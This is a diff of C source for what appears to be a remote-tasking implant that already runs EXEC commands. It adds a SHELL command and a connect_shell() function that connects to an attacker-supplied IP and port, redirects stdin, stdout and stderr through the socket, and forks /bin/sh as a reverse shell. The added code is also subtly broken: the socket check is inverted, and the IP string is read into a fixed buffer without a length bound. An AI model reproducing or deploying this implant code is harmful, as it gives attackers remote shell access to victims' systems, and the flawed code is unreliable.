@@ -1,6 +1,7 @@
 #include <arpa/inet.h>
 #include <errno.h>
 #include <netinet/in.h>
+#include <poll.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
@@ -11,9 +12,63 @@
 
 #include "macros.h"
 
-#define MAX_DATA_SIZE 64000   // a bit smaller than the maximum TCP/UDP payload sizes
-#define IP4_LEN_MAX 16        // xxx.xxx.xxx.xxx\0
-#define MAX_EXEC_OUTPUT 1024  // max bytes of stdout to capture from EXEC commands
+#define MAX_DATA_SIZE 64000      // a bit smaller than the maximum TCP/UDP payload sizes
+#define IP4_LEN_MAX 16           // xxx.xxx.xxx.xxx\0
+#define MAX_EXEC_OUTPUT 1024     // max bytes of stdout to capture from EXEC commands
+#define SHELL_CONN_TIMEOUT 5000  // 5 seconds
+
+int connect_shell(char *ip, int port)
+{
+    int retval = -1;
+    int sock_fd = 0;
+
+    // open the reverse shell connection
+    sock_fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);  // TCP over IPv4
+    if (0 >= sock_fd)
+    {
+        struct sockaddr_in saddr = {0};
+        saddr.sin_family = AF_INET;
+        saddr.sin_port = htons(port);
+
+        if (1 == inet_pton(AF_INET, ip, &saddr.sin_addr.s_addr))
+        {
+            struct pollfd fds = {0};
+            fds.fd = sock_fd;
+            fds.events = POLLOUT;
+
+            // wait for the connection to be made (up to 5 seconds)
+            (void)connect(sock_fd, (struct sockaddr *)&saddr, sizeof(saddr));
+            if (1 == poll(&fds, 1, SHELL_CONN_TIMEOUT))
+            {
+                // redirect stdin + stdout + sterr through the socket
+                int redir_in = dup2(sock_fd, STDIN_FILENO);
+                int redir_out = dup2(sock_fd, STDOUT_FILENO);
+                int redir_err = dup2(sock_fd, STDERR_FILENO);
+                if ((-1 != redir_in) && (-1 != redir_out)&& (-1 != redir_err))
+                {
+                    // fork and run /bin/sh (inherits socket fds)
+                    if (0 == fork())
+                    {
+                        // child
+                        char *bin_sh = "/bin/sh";
+                        char *argv[] = {bin_sh, NULL};
+                        char *env[] = {"HOME=/", NULL};
+                        (void)execve(bin_sh, argv, env);
+                    }
+                    else
+                    {
+                        // parent (return 0 and hope for the best)
+                        retval = 0;
+                    }
+                }
+            }
+        }
+        // safe to close in parent
+        close(sock_fd);
+    }
+
+    return retval;
+}
 
 char *do_task(char *cmd_str)
 {
@@ -65,7 +120,7 @@ char *do_task(char *cmd_str)
             if (NULL != out)
             {
                 int sys_ret = -1;
-                (void)fread(out_buf, sizeof(char), MAX_EXEC_OUTPUT, out);
+                size_t size = fread(out_buf, sizeof(char), MAX_EXEC_OUTPUT, out);
                 sys_ret = pclose(out);
 
                 sprintf(res_str, "%d;%s", sys_ret, out_buf);
@@ -73,6 +128,20 @@ char *do_task(char *cmd_str)
             }
             free(res_str);
             free(out_buf);
+        }
+    }
+
+    // SHELL
+    if (0 == strncmp(cmd_str, "SHELL ", 6))
+    {
+        char ip_str[IP4_LEN_MAX] = {0};
+        int tcp_port = 0;
+        if (2 == sscanf(cmd_str + 6, "%[^:]:%d", ip_str, &tcp_port))
+        {
+            if (0 == connect_shell(ip_str, tcp_port))
+            {
+                response = base64_encode("CONNECTED", 9, &response_len);
+            }
         }
     }
 
@@ -134,8 +203,7 @@ int main()
         goto cleanup;
     }
     // host:port;base64
-    int val = fscanf(procfile, "%[^:]:%d;%s", ip_str, &tcp_port, taskbuf);
-    if (3 != val)
+    if (3 != fscanf(procfile, "%[^:]:%d;%s", ip_str, &tcp_port, taskbuf))
     {
         retval = -3;
         goto cleanup;
